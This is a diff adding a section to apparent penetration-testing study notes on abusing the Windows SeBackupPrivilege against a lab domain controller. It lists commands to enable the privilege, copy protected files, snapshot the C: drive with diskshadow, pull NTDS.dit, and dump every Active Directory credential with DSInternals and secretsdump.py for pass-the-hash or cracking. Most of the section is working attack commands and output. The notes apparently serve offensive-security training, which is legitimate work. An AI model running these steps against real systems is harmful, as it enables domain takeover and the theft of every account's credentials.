@@ -2961,12 +2961,71 @@ We may also come across .kdbx KeePass database files, OneNote notebooks, files s
 
 ##### Enabling SeBackupPrivilege
 
+The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.
+
+This can allow for attacks on the DC including copying protected files such as NTDS.dit which can be used to later extract creds.  
+
 | **Command** | **Description** | 
 | --- | --- |
-| | |
-| | |
-| | |
+| [SeBackupPrivilegeUtils](https://github.com/giuliano108/SeBackupPrivilege) | Downloaded both Dlls at bottom of project|
+| `Import-Module .\SeBackupPrivilegeUtils.dll Import-Module .\SeBackupPrivilegeCmdLets.dll` | Import both modules |
+| `whoami /priv \| findstr Backup` | Priv check |
+| `SetBackupPrivilege`| Enables BackupPriv right |
+| `Get-SeBackupPrivilege` | Checks for right once module imported |
+| ` Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt `| Copy Protected file once priv enabled | 
 
+With the priv now enabled, we can focus on attacking the NTDS file, by first making a copy of the disk using diskshadow. As we are unable to fully interact with the NTDS.dit file as it is in use, unlike a copied version.  
+
+```
+diskshadow.exe
+
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC,  10/14/2020 12:57:52 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context clientaccessible
+DISKSHADOW> set context persistent
+DISKSHADOW> begin backup
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> end backup
+DISKSHADOW> exit
+
+dir E:
+
+
+    Directory: E:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         5/6/2021   1:00 PM                Confidential
+d-----        9/15/2018  12:19 AM                PerfLogs
+d-r---        3/24/2021   6:20 PM                Program Files
+d-----        9/15/2018   2:06 AM                Program Files (x86)
+d-----         5/6/2021   1:05 PM                Tools
+d-r---         5/6/2021  12:51 PM                Users
+d-----        3/24/2021   6:38 PM                Windows
+
+```
+By using diskshadow, we have now made a copy of the C:\ drive which can be used to grab the NTDS.dit file. 
+
+`Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
+
+With the NTDS.dit extracted, we can use a tool such as secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. Below example extracts the Administrator using DSInternals 
+
+```
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+
+```
+We can achieve similar using SecretsDump to dump hashes locally for use with PassTheHash attacks or to crack.  
+
+`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
 
 
 
